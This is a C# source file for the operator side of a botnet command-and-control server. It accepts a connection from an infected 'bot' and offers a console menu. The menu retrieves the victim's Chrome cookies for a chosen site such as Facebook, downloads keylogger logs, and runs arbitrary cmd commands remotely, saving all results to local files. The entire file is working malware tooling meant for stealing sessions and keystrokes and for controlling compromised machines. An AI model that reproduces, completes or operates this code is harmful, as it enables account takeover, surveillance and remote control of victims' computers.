using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.Remoting.Channels;
using System.IO;
using System.Runtime.InteropServices.ComTypes;

namespace Control
{
     class Program
    {
        //static IPAddress address = IPAddress.Parse("192.168.1.102");
        //static TcpListener listener = new TcpListener(address, 6969);
        private const int BUFFER_SIZE = 1024;
        private const int PORT_NUMBER = 9669;
        static ASCIIEncoding encoding = new ASCIIEncoding();
        static void Main(string[] args)
        {
            try
            {

                IPAddress address = IPAddress.Parse("192.168.1.100");

                TcpListener listener = new TcpListener(address, PORT_NUMBER);

                // 1. listen
                listener.Start();

                Console.WriteLine("Server started on " + listener.LocalEndpoint);
                Console.WriteLine("Waiting for a connection...");


                TcpClient tcplient = listener.AcceptTcpClient();

                Console.WriteLine("Connection received from " + tcplient.Client.RemoteEndPoint);
               // Socket socket = listener.AcceptSocket();


                while (true)
                {
                    Console.WriteLine(" Command & Control Center");
                    Console.Write("Enter your command: ");
                    string command = Console.ReadLine();

                    // handleCommand(command,socket);
                    handleCommand(command, tcplient);
                }

            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex);
            }
        }

        public static void receiveFileSocket(TcpClient client,string type)
        {

            string fileName ="";
            if (type =="cookies")
            {
                fileName = "cookies.txt";
            }  
            else if( type =="keylogger")
            {
                fileName = "keylogger.txt";
            }
            else if (type == "cmd")
            {
                fileName = "cmdResult.txt";
            }

            NetworkStream stream = client.GetStream();

                byte[] fileSizeBytes = new byte[4];
                int bytes = stream.Read(fileSizeBytes, 0, 4);
                int dataLength = BitConverter.ToInt32(fileSizeBytes, 0);

                int bytesLeft = dataLength;
                byte[] data = new byte[dataLength];

                int bufferSize = 1024;
                int bytesRead = 0;

            while (bytesLeft > 0)
            {
                int curDataSize = Math.Min(bufferSize, bytesLeft);
                if (client.Available < curDataSize)
                    curDataSize = client.Available; //This saved me

                bytes = stream.Read(data, bytesRead, curDataSize);

                bytesRead += curDataSize;
                bytesLeft -= curDataSize;

            }
                FileStream fs = new FileStream(fileName, FileMode.OpenOrCreate);
                fs.Write(data, 0, dataLength);
                fs.Close();
         }    
        public static void handleCommand(string command,TcpClient client )
        {
            Socket socket = client.Client;
            command = command.Trim().ToLower();
            if(command == "clear")
            {
                Console.Clear();

            } 
            else if(command == "exit")
            {
                //socket.Send(encoding.GetBytes("exit"));

                sendMessageSocket("exit", socket);
                Console.WriteLine("Sending exit command...");

                // receive message
                //byte[] data = new byte[BUFFER_SIZE];
                //socket.Receive(data);
                //Console.WriteLine("Client: " + encoding.GetString(data));


                string messageReceive = receiveMessageSocket(socket);
                Console.WriteLine("Client: " + messageReceive);

            }
            else if(command== "get cookies")
            {
                
                Console.WriteLine("Enter url you want to get cookie, please write full url (example : https://www.facebook.com):");
                string url = Console.ReadLine();
                string ms = "cookies?" + url + "?";


                //Console.WriteLine(ms);
                //socket.Send(encoding.GetBytes(ms));

                sendMessageSocket(ms, socket);
                Console.WriteLine("Sending request get cookies...");


                receiveFileSocket(client,"cookies");
                Console.WriteLine("Receive cookies complete!");



                //byte[] data = new byte[BUFFER_SIZE];
                //socket.Receive(data);
                //Console.WriteLine("Client: " + encoding.GetString(data));
                //byte[] buffer = new byte[1024];
                //int bytesRead = stream.Read(buffer, 0, buffer.Length);
                //string message = Encoding.ASCII.GetString(buffer, 0, bytesRead);
                //Console.WriteLine("Client: " + message);

            }
            else if (command == "get keylogger")
            {

                //<------send message example------->
                //socket.Send(encoding.GetBytes("keylogger"));
                //Console.WriteLine("Sending request get keylogger...");
                //byte[] data = new byte[BUFFER_SIZE];
                //socket.Receive(data);
                //Console.WriteLine("Client: " + encoding.GetString(data));

                //<------send message & receive file ------->


                //socket.Send(encoding.GetBytes("keylogger"));
                sendMessageSocket("keylogger", socket);
                Console.WriteLine("Sending request get keylogger...");
                receiveFileSocket(client, "keylogger");
                Console.WriteLine("Receive keylogger complete!");


            }
            else if (command == "run cmd command")
            {
                string cmd = "";
                Console.Write("Enter command:");
                cmd = Console.ReadLine();
                string ms = "run cmd command " + cmd;


                sendMessageSocket(ms,socket);
                Console.WriteLine("Sending request run cmd command...");


                receiveFileSocket(client, "cmd");
                Console.WriteLine("Receive rs command complete!");


            }
            else if (command == "read keylogger")
            {
                string type = "keylogger";
                string rs = readFile(type);
                Console.Write(rs);

            }
            else if (command == "read cookies")
            {
                string type = "cookies";
                string rs = readFile(type);
                Console.Write(rs);

            }
            else if (command == "read cmd command")
            {
                string type = "cmd";
                string rs = readFile(type);
                Console.Write(rs);

            }
            else if(command == "help")
            {
                Console.WriteLine("get cookies                         --> Get Cookies Chrome From Bot");
                Console.WriteLine("get keylogger                       --> Get File From Bot");
                Console.WriteLine("run cmd command                     --> Get Result Command From Bot");
                Console.WriteLine("read keylogger                      --> Read Keylogger File From Bot");
                Console.WriteLine("read cookies                        --> Read Cookies File From Bot");
                Console.WriteLine("read cmd command                    --> Read CMD Command File From Bot");
                Console.WriteLine("clear                               --> Clear The Screen");
                Console.WriteLine("exit                                --> Exit Socket");
            }
               
        }
        public static void sendMessageSocket(string message,Socket socket)
        {
            socket.Send(encoding.GetBytes(message));
        }
        public static string receiveMessageSocket(Socket socket)
        {
            byte[] data = new byte[BUFFER_SIZE];
            socket.Receive(data);
            string rs = encoding.GetString(data);
            return rs;
        }


        public static string readFile(string type)
        {
            string fileName = "";
            if (type == "cookies")
            {
                fileName = "cookies.txt";
            }
            else if (type == "keylogger")
            {
                fileName = "keylogger.txt";
            }
            else if (type == "cmd")
            {
                fileName = "cmdResult.txt";
            }

            string rs = "";

            if(File.Exists(fileName))
            {
                string[] lines = File.ReadAllLines(fileName);

                foreach (string line in lines)
                {
                    rs += line + "\n";
                }
            }
            else
            {
                rs = "The file " + fileName + " does not exist\n You need get "+fileName + " from botnet\n";
            }

            return rs;
        }
    }
}
